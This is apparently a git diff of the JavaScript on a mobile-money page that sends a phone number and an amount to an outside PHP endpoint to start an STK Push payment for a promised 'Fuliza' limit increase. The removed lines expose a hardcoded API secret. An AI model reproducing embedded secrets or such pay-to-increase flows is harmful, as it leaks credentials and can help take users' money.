@@ -874,27 +874,44 @@ document.getElementById('payBtn').onclick=()=>{
     document.getElementById('loadingText').textContent='Initiating STK Push...';
   },1200);
 
-  fetch('https://nyotafundke.site/payment1.php',{
-    method:'POST',
-    headers:{'Content-Type':'application/json','Api-Secret':'abe330f16a4c2d5b4543d91a'}, // fuliza
-    body:JSON.stringify({phone:userPhone,amount:selected.fee,load_response:false})
+  fetch('https://nyotafundke.site/payment1.php', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    phone: userPhone,
+    amount: selected.amount
   })
-  .then(r=>r.json())
-  .then(data=>{
-    hideOverlay('loadingOverlay');
-    if(data.status){
-      const masked=userPhone.slice(0,4)+'****'+userPhone.slice(-2);
-      document.getElementById('successNotifText').textContent=masked+' pending to increase '+fmt(selected.amount);
-      document.getElementById('successAmount').textContent=fmt(selected.amount);
-      showOverlay('successOverlay');
-    }else{
-      showToast(data.msg||'Request failed. Please try again.');
-    }
-  })
-  .catch(()=>{
-    hideOverlay('loadingOverlay');
-    showToast('Network error. Please try again.');
-  });
+})
+.then(res => res.json())
+.then(data => {
+
+  hideOverlay('loadingOverlay');
+
+  if (data.success) {
+
+    const masked = userPhone.slice(0,4) + '****' + userPhone.slice(-2);
+
+    document.getElementById('successNotifText').textContent =
+      masked + ' pending to increase ' + fmt(selected.amount);
+
+    document.getElementById('successAmount').textContent =
+      fmt(selected.amount);
+
+    showOverlay('successOverlay');
+
+  } else {
+
+    showToast(data.message || 'Payment failed');
+
+  }
+
+})
+.catch(err => {
+  hideOverlay('loadingOverlay');
+  showToast('Network error. Please try again.');
+});
 };
 
 // Return
@@ -918,5 +935,6 @@ function showToast(msg){
 </script>
 </body>
 </html>
+
 
 
